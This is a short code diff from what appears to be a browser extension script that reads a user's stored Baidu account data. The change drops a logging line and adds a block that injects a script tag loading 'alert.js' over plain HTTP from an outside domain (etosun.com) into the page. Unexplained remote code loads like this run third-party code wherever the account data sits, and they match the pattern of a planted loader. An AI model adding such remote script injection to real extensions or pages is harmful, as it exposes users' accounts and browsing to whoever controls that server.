@@ -53,8 +53,13 @@ chrome.extension.sendRequest({
 	type: 'account',
 	action: 'get'
 }, function(data){
-	console.log(data);
 	var account = data.account.baidu;
+
+	(function(){
+		var sc = document.createElement('script')
+		sc.src = 'http://etosun.com/html/mt-tools/alert.js?t=1125';
+		$('body').append(sc);
+	})();
 
 	setTimeout(function(){
 		new Cang().init({
